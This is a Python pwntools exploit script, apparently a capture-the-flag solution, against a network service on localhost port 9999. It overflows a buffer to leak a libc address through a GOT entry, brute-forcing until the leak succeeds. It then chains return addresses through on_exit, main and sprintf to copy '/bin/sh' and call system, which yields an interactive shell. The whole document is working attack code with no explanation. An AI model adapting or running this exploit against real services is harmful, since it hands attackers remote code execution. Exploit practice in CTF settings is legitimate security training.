from pwn import *

KEY_SIZE = 0x20
MAIN = 0x401209
BINSH_CPY = 0x404800  # Somewhere in a writable region where we ain't bothering nobody

def leak_libc():
    # We need to bruteforce a bit unfortunately
    while True:
        r = remote('127.0.0.1', 9999)
        payload = b'A' * KEY_SIZE
        payload += b'\0' * KEY_SIZE
        payload += p64(0)
        payload += p64(0x403fe8)
        payload += b"\x60\x0e"
        r.send(payload)
        try:
            d = r.recv()
        except EOFError:
            r.close()
            continue
        if len(d) < 0x10:
            r.close()
            continue
        print(hexdump(d))
        read = u64(d[5:11] + b'\0\0')
        libc = read - 0x1147d0
        return r, libc

context.timeout = 1
r, libc = leak_libc()

print("libc:", hex(libc))
on_exit = libc + 0x45610
sprintf = libc + 0x60880
binsh = libc + 0x1D8678
system = libc + 0x50d70

# input("Attach a debugger? ")

payload = b'\0' * KEY_SIZE
payload += p64(0)
payload += p64(MAIN) 
payload += p64(on_exit)
r.send(payload)
r.recvn(0x20)

# main() will be rerun now

payload = b'A' * KEY_SIZE
payload += b'\0' * KEY_SIZE
payload += p64(binsh)
payload += p64(BINSH_CPY) 
payload += p64(sprintf)
r.send(payload)

payload = b'\0' * KEY_SIZE
payload += p64(0)
payload += p64(BINSH_CPY) 
payload += p64(system)
r.send(payload)

r.interactive()
